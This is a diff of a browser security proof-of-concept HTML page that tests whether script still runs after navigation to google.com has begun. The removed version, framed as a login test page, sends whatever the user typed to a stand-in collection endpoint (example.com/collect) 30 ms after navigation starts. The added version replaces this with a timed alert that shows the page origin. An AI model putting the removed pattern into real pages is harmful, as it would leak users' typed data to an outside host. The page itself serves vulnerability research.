@@ -1,52 +1,70 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Transient Origin Confusion PoC</title>
+<title>Address Bar Update Before Alert Test</title>
 <style>
-body {
-  font-family: Arial, sans-serif;
-  padding: 40px;
-}
-input, button {
-  padding: 10px;
-  font-size: 16px;
-  margin-top: 10px;
-}
-#status {
-  margin-top: 20px;
-  font-size: 14px;
-  color: #444;
-}
+  body {
+    font-family: Arial, sans-serif;
+    background: #0f172a;
+    color: #e5e7eb;
+    padding: 40px;
+  }
+  button {
+    padding: 14px 22px;
+    font-size: 16px;
+    border-radius: 8px;
+    border: none;
+    cursor: pointer;
+    background: #2563eb;
+    color: white;
+  }
+  pre {
+    margin-top: 20px;
+    background: #020617;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 13px;
+    border: 1px solid #1e293b;
+  }
 </style>
 </head>
 
 <body>
 
-<h2>Login (Test Page)</h2>
-<p>Enter any text and click submit.</p>
+<h1>Navigation Race Condition Test</h1>
+<p>
+This test attempts to trigger an alert
+<strong>after navigation has started</strong>
+and the address bar has updated.
+</p>
 
-<input id="data" placeholder="Type here">
-<br>
-<button onclick="go()">Submit</button>
+<button onclick="runTest()">Run Test</button>
 
-<div id="status"></div>
+<pre id="log"></pre>
 
 <script>
-function go() {
-  document.getElementById("status").innerText =
-    "Redirecting to google.com...";
+function log(msg) {
+  document.getElementById("log").textContent += msg + "\n";
+}
 
-  // Kirim data SETELAH navigasi dimulai
+function runTest() {
+  const start = performance.now();
+  log("[+] Clicked at " + start.toFixed(2) + " ms");
+
+  // Schedule alert slightly delayed
   setTimeout(() => {
-    fetch("https://example.com/collect", {
-      method: "POST",
-      body: document.getElementById("data").value,
-      keepalive: true
-    });
-  }, 30);
+    const t = performance.now();
+    log("[!] Alert executed at " + t.toFixed(2) + " ms");
+    alert(
+      "Delayed alert executed.\n\n" +
+      "JS origin: " + location.origin
+    );
+  }, 30); // ⚠️ ubah 10–50 ms untuk eksperimen
 
-  // Trigger navigation
+  // Trigger navigation immediately
+  const nav = performance.now();
+  log("[+] Navigation triggered at " + nav.toFixed(2) + " ms");
   location.href = "https://www.google.com";
 }
 </script>
